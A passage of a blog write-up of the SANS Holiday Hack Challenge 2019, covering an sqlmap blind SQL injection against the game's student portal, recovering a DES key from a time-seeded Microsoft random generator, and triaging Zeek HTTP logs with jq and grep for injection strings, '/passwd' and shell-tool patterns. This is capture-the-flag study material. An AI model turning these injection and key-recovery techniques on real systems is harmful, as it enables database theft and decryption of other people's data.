<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D information_schema -T system_variables -C VARIABLE_NAME,GLOBAL_VALUE,SESSION_VALUE,DEFAULT_VALUE --dump  --threads<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span> --where <span style="color:#f1fa8c">&#34;VARIABLE_NAME LIKE &#39;%max_allowed_packet%&#39;&#34;</span>
Database: information_schema
Table: system_variables
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">2</span> entries<span style="color:#ff79c6">]</span>
+--------------------------+--------------+---------------+---------------+
| VARIABLE_NAME            | GLOBAL_VALUE | SESSION_VALUE | DEFAULT_VALUE |
+--------------------------+--------------+---------------+---------------+
| SLAVE_MAX_ALLOWED_PACKET | <span style="color:#bd93f9">1073741824</span>   | NULL          | <span style="color:#bd93f9">1073741824</span>    |
| MAX_ALLOWED_PACKET       | <span style="color:#bd93f9">16777216</span>     | <span style="color:#bd93f9">16777216</span>      | <span style="color:#bd93f9">4194304</span>       |
+--------------------------+--------------+---------------+---------------+
</code></pre></td></tr></table>
</div>
</div><p>16777216 wich I believe represents 16MB maximum to load a file,
so it should be more then enough to download the files unless I am not looking in the right location?</p>
<p>Why not looking in the web portal instead?</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">for</span> i in 0f5f510e 1cc7e121 439f15e6 667d6896 adb798ca ba417715; <span style="color:#ff79c6">do</span> curl -Ok https://studentportal.elfu.org/krampus/<span style="color:#8be9fd;font-style:italic">$i</span>.png &amp; <span style="color:#ff79c6">done</span>
</code></pre></td></tr></table>
</div>
</div><p>Yes, it downloads the files &hellip; We can now open the downloaded images which represents the scraps of papers &hellip;
we retrieve the cutting edge santa&rsquo;s sleigh guiding system :)</p>
<p><strong>Bonus:</strong>
When visiting some throwable email address such as ..@yopmail.com
and opening the inbox, we can find the emails with the answer for the ML challenge from another player ðŸ˜†</p>
<p>Loooool ðŸ¤£ðŸ¤£ðŸ¤£ !!! SANS needs to review that on next year challenge &hellip;</p>
<p>Maybe also someI possible GDPR issues for those who disclose their real email address ;)</p>
<h2 id="crypto-challenge">Crypto challenge</h2>
<ul>
<li>file elfscrow.exe</li>
<li>elfscrow.exe: PE32 executable (console) Intel 80386, for MS Windows</li>
<li>DES cryptanalysis</li>
</ul>
<p>First we generate a bunch of file containing &lsquo;A&rsquo; a certain number of times.
As an example A7.txt contains 7*&lsquo;A&rsquo;, when A32.txt contains 32*&lsquo;A&rsquo; &hellip;
it allows us to figure out that the encryption algorithm is DES with 8 bytes keys.</p>
<p>Kudos to <a href="https://www.youtube.com/watch?v=obJdpKDpFBA">Ron Bowes</a> for this excellent introduction tutorial on crypto reverse engineering.</p>
<p>We could alternatively have figure out the algorithm from IDA with this <a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">reference</a>
which explains the ALG_ID=6601 passed to <code>mov [ebp+keyBlob.hdr.aiKeyAlg], 6601h</code> is for DES algorithm.</p>
<p>Looking at elfscrow.exe binary in IDA-free,
We find some functions of interest, including super_secure_random(..) function
where we see the below two hexadecimal values:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#bd93f9">0x269EC3</span>
<span style="color:#bd93f9">2531011</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#bd93f9">0x343FD</span>
<span style="color:#bd93f9">214013</span>
</code></pre></td></tr></table>
</div>
</div><p>Googling for those values,
we find that they are commonly used parameters of <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">LCGs on Microsoft implementation</a>
and we can get its python implementation on <a href="https://rosettacode.org/wiki/Linear_congruential_generator#Python">rosettacode.org</a>.</p>
<p>The below implementation is a PSeudo-Random Number Generator (PRNG) implementation by Microsoft.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">msvcrt_rand</span>(seed):
   <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rand</span>():
      <span style="color:#ff79c6">nonlocal</span> seed
      seed <span style="color:#ff79c6">=</span> (<span style="color:#bd93f9">214013</span><span style="color:#ff79c6">*</span>seed <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2531011</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x7fffffff</span>
      <span style="color:#ff79c6">return</span> seed <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">16</span>
   <span style="color:#ff79c6">return</span> rand
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s find out about the seed, which is a pointer on dword: <code>seed= dword ptr 8</code>.
The binary being 32 bit, then the seed is 32bits long.
Looking in IDA at the function generate_key, we figure out the seed is generated from a timestamp :</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#50fa7b">call</span>    time
<span style="color:#50fa7b">add</span>     esp, <span style="color:#bd93f9">4</span>
<span style="color:#50fa7b">push</span>    eax             <span style="color:#6272a4">; seed
</span><span style="color:#6272a4"></span>call    super_secure_srand <span style="color:#6272a4">; super_secure_srand(int)
</span></code></pre></td></tr></table>
</div>
</div><p>the time function call <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/time-time32-time64?view=vs-2019">_time64</a> returns the time as seconds elapsed since midnight, January 1, 1970, or -1 in the case of an error. It means that we can generate the exact same seed or bruteforce it if we know a narrow interval time.</p>
<p>We got the following hints for this objective: <strong>We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.</strong>
which is only 2hours<em>60</em>60=7,200 seconds.</p>
<p>Bruteforcing the file will take at most 7,200 tries.</p>
<p>The &ldquo;super secure srand&rdquo; doesn&rsquo;t do much, it simply prints out the seed
and put it in the &lsquo;state&rsquo; variable which is used later by super_secure_random function
which is equivalent to the python msvcrt_rand(seed) above</p>
<h2 id="objective-12-filter-out-poisoned-sources-of-weather-data">Objective 12 Filter out poisoned sources of weather data</h2>
<ul>
<li><a href="https://downloads.elfu.org/http.log.gz">zip logs</a></li>
<li><a href="https://srf.elfu.org/">Santa&rsquo;s mapping software</a> but we don&rsquo;t have the username, and we only know the password is a default password</li>
</ul>
<p>After decompression of the log archive, we explore a huge 41MB file containing a unique line which is too resources demanding for my <code>vi</code>.
The file being too big, I cannot either <code>cat</code> on the command line, and because it&rsquo;s all on one row, we cannot <code>head -1</code> either :(
On this unique line, we observe a json array of zeek log entries that we can beautify with <code>jq</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -Ok https://downloads.elfu.org/http.log.gz
gunzip http.log.gz
cat http.log | jq <span style="color:#f1fa8c">&#39;.[]&#39;</span>  &gt; http.json
head -32 http.json
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">  {
    <span style="color:#ff79c6">&#34;ts&#34;</span>: <span style="color:#f1fa8c">&#34;2019-10-05T06:50:42-0800&#34;</span>,
    <span style="color:#ff79c6">&#34;uid&#34;</span>: <span style="color:#f1fa8c">&#34;ClRV8h1vYKWXN1G5ke&#34;</span>,
    <span style="color:#ff79c6">&#34;id.orig_h&#34;</span>: <span style="color:#f1fa8c">&#34;238.27.231.56&#34;</span>,
    <span style="color:#ff79c6">&#34;id.orig_p&#34;</span>: <span style="color:#bd93f9">60677</span>,
    <span style="color:#ff79c6">&#34;id.resp_h&#34;</span>: <span style="color:#f1fa8c">&#34;10.20.3.80&#34;</span>,
    <span style="color:#ff79c6">&#34;id.resp_p&#34;</span>: <span style="color:#bd93f9">80</span>,
    <span style="color:#ff79c6">&#34;trans_depth&#34;</span>: <span style="color:#bd93f9">1</span>,
    <span style="color:#ff79c6">&#34;method&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>,
    <span style="color:#ff79c6">&#34;host&#34;</span>: <span style="color:#f1fa8c">&#34;srf.elfu.org&#34;</span>,
    <span style="color:#ff79c6">&#34;uri&#34;</span>: <span style="color:#f1fa8c">&#34;/14.10/Google/&#34;</span>,
    <span style="color:#ff79c6">&#34;referrer&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;version&#34;</span>: <span style="color:#f1fa8c">&#34;1.0&#34;</span>,
    <span style="color:#ff79c6">&#34;user_agent&#34;</span>: <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)&#34;</span>,
    <span style="color:#ff79c6">&#34;origin&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;request_body_len&#34;</span>: <span style="color:#bd93f9">0</span>,
    <span style="color:#ff79c6">&#34;response_body_len&#34;</span>: <span style="color:#bd93f9">232</span>,
    <span style="color:#ff79c6">&#34;status_code&#34;</span>: <span style="color:#bd93f9">404</span>,
    <span style="color:#ff79c6">&#34;status_msg&#34;</span>: <span style="color:#f1fa8c">&#34;Not Found&#34;</span>,
    <span style="color:#ff79c6">&#34;info_code&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;info_msg&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;tags&#34;</span>: <span style="color:#f1fa8c">&#34;(empty)&#34;</span>,
    <span style="color:#ff79c6">&#34;username&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;password&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;proxied&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;orig_fuids&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;orig_filenames&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;orig_mime_types&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;resp_fuids&#34;</span>: <span style="color:#f1fa8c">&#34;FUPWLQXTNsTNvf33&#34;</span>,
    <span style="color:#ff79c6">&#34;resp_filenames&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;resp_mime_types&#34;</span>: <span style="color:#f1fa8c">&#34;text/html&#34;</span>
  },
</code></pre></td></tr></table>
</div>
</div><p>Now it&rsquo;s gonna be much easier to manipulate :) so let&rsquo;s count the number of logs</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | jq <span style="color:#f1fa8c">&#39;.uid&#39;</span> | wc -l
<span style="color:#bd93f9">55121</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># investigate .username field</span>
cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39;select (.username != &#34;-&#34;) | .username &#39;</span> | sort | uniq -c | sort -rn | tail -50
      <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
      <span style="color:#bd93f9">4</span> <span style="color:#f1fa8c">&#34;&#39; or &#39;1=1&#34;</span>
      <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;-r nessus&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>Few rows looks suscpicious and deserves further investigations.
We execute the above commands for every single field by replacing username with other field names,
and we can find some fields of intrests such as <code>user_agent, uri, username, host</code>.</p>
<p>for example, the host <code>ssrf.elfu.org</code> is obviously malicious as it does not exist</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39;select (.username | contains(&#34;&#39;&#39;1=1&#34;)) &#39;</span> &gt;&gt; http.json.malicious
cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39;select (.username | contains(&#34;-r nessus&#34;)) &#39;</span> &gt;&gt; http.json.malicious
cat http.json | jq -c <span style="color:#f1fa8c">&#39; &#39;</span> | grep <span style="color:#f1fa8c">&#34;ssrf.elfu&#34;</span> | jq <span style="color:#f1fa8c">&#39; &#39;</span> &gt;&gt; http.json.malicious
</code></pre></td></tr></table>
</div>
</div><p>Exploration of possible SQL Injection, File Injection, XSS, and shell stuffs
The following bring into light above 60 IP adresses that we can store in a json file with the following command:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39; &#39;</span> | egrep <span style="color:#f1fa8c">&#34;union|&lt;|/passwd|/bash/ruby/perl/python&#34;</span> &gt;&gt; http.json.malicious
</code></pre></td></tr></table>
</div>
</div><p>Looking at suspicious user_agent,
we find this <a href="https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml">resource</a>
which detects suspicious user agent strings used by malware in proxy logs.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39;.user_agent &#39;</span> | egrep <span style="color:#f1fa8c">&#34;zeroup| adlib|tiny|bgroom|changhuatong|choltbagent|mozilla/5.0 wininet|rookie/1.0|backdoorbot|charon|inferno| pxyscand| asd| mdms|sample|nocase|moxilla|win32 |agent |autoit|iczeliondownload|httpbrowser/1.0|&lt;\|&gt;|nsis_inetc|wget/1.9\+cvs-stable \(red hat modified\)&#34;</span> | sort | uniq -c | sort -rn
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;wget/1.9+cvs-stable (red hat modified)&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;rookie/1.0&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;mozilla/5.0 wininet&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;httpbrowser/1.0&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;choltbagent&#34;</span>

cat http.json | jq -c <span style="color:#f1fa8c">&#39; [&#34;wget/1.9+cvs-stable (red hat modified)&#34;, &#34;rookie/1.0&#34;, &#34;mozilla/5.0 wininet&#34;, &#34;httpbrowser/1.0&#34;, &#34;choltbagent&#34;] as $blacklist | select ( .[&#34;id.orig_h&#34;] as $in | $blacklist | index($in) ) &#39;</span> &gt;&gt; http.json.malicious
</code></pre></td></tr></table>
</div>
</div><p>From the http.json.malicious file, we can try to pivot on the user_agent.
I have extracted all user_agent and then escaped some special characters:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
